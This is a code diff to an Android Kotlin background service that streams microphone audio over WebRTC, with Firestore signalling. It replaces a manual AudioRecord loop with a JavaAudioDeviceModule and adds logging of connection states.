@@ -6,9 +6,6 @@ import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
-import android.media.AudioFormat
-import android.media.AudioRecord
-import android.media.MediaRecorder
 import android.os.Build
 import android.os.IBinder
 import android.os.PowerManager
@@ -26,15 +23,14 @@ class AudioService : Service() {
         private const val TAG = "AudioService"
         private const val NOTIFICATION_ID = 9999
         private const val CHANNEL_ID = "bg_service"
-        private const val SAMPLE_RATE = 16000
     }
 
-    private var audioRecord: AudioRecord? = null
     private var peerConnectionFactory: PeerConnectionFactory? = null
     private var peerConnection: PeerConnection? = null
     private var audioSource: AudioSource? = null
     private var audioTrack: AudioTrack? = null
     private var eglBase: EglBase? = null
+    private var audioDeviceModule: JavaAudioDeviceModule? = null
 
     private var wakeLock: PowerManager.WakeLock? = null
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
@@ -83,10 +79,10 @@ class AudioService : Service() {
         )).addOnFailureListener { Log.e(TAG, "Failed to update offline status", it) }
         audioTrack?.dispose(); audioTrack = null
         audioSource?.dispose(); audioSource = null
-        audioRecord?.release(); audioRecord = null
         peerConnection?.close(); peerConnection = null
         peerConnectionFactory?.dispose(); peerConnectionFactory = null
         eglBase?.release(); eglBase = null
+        audioDeviceModule?.release(); audioDeviceModule = null
         releaseWakeLock()
         stopForeground(STOP_FOREGROUND_REMOVE)
         stopSelf()
@@ -100,12 +96,13 @@ class AudioService : Service() {
             .createInitializationOptions()
         PeerConnectionFactory.initialize(initOpts)
 
-        val encoderFactory = DefaultVideoEncoderFactory(eglBase!!.eglBaseContext, true, true)
-        val decoderFactory = DefaultVideoDecoderFactory(eglBase!!.eglBaseContext)
+        val audioDeviceModule = JavaAudioDeviceModule.builder(this)
+            .setUseHardwareAcousticEchoCanceler(false)
+            .setUseHardwareNoiseSuppressor(false)
+            .createAudioDeviceModule()
 
         peerConnectionFactory = PeerConnectionFactory.builder()
-            .setVideoEncoderFactory(encoderFactory)
-            .setVideoDecoderFactory(decoderFactory)
+            .setAudioDeviceModule(audioDeviceModule)
             .createPeerConnectionFactory()
 
         val iceServers = listOf(
@@ -118,10 +115,18 @@ class AudioService : Service() {
         }
 
         peerConnection = peerConnectionFactory!!.createPeerConnection(rtcConfig, object : PeerConnection.Observer {
-            override fun onSignalingChange(s: PeerConnection.SignalingState?) {}
-            override fun onIceConnectionChange(s: PeerConnection.IceConnectionState?) {}
-            override fun onIceConnectionReceivingChange(r: Boolean) {}
-            override fun onIceGatheringChange(s: PeerConnection.IceGatheringState?) {}
+            override fun onSignalingChange(s: PeerConnection.SignalingState?) {
+                Log.d(TAG, "Signaling state: $s")
+            }
+            override fun onIceConnectionChange(s: PeerConnection.IceConnectionState?) {
+                Log.d(TAG, "ICE connection state: $s")
+            }
+            override fun onIceConnectionReceivingChange(r: Boolean) {
+                Log.d(TAG, "ICE receiving: $r")
+            }
+            override fun onIceGatheringChange(s: PeerConnection.IceGatheringState?) {
+                Log.d(TAG, "ICE gathering state: $s")
+            }
             override fun onIceCandidate(c: IceCandidate?) { c?.let { sendCandidateToFirestore(it) } }
             override fun onIceCandidatesRemoved(c: Array<out IceCandidate>?) {}
             override fun onAddStream(s: MediaStream?) {}
@@ -133,24 +138,14 @@ class AudioService : Service() {
     }
 
     private fun startMicCapture() {
-        val bufSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT)
-        audioRecord = AudioRecord(MediaRecorder.AudioSource.MIC, SAMPLE_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufSize)
-
-        audioSource = peerConnectionFactory!!.createAudioSource(MediaConstraints())
-        audioTrack = peerConnectionFactory!!.createAudioTrack("audio", audioSource)
-        peerConnection?.addTrack(audioTrack, listOf("stream"))
-
-        audioRecord?.startRecording()
-
-        val deviceId = DeviceRegistrar.getDeviceId(this)
-        serviceScope.launch(Dispatchers.IO) {
-            val buf = ByteArray(3200)
-            while (isStreaming && audioRecord?.recordingState == AudioRecord.RECORDSTATE_RECORDING) {
-                val read = audioRecord?.read(buf, 0, buf.size) ?: 0
-                if (read > 0) {
-                    // Audio is being captured; WebRTC sends automatically via the track
-                }
-            }
+        try {
+            audioSource = peerConnectionFactory!!.createAudioSource(MediaConstraints())
+            audioTrack = peerConnectionFactory!!.createAudioTrack("audio", audioSource)
+            audioTrack?.setEnabled(true)
+            peerConnection?.addTrack(audioTrack!!, listOf("stream"))
+            Log.i(TAG, "Mic capture started, audio track added to PeerConnection")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to start mic capture", e)
         }
     }
 
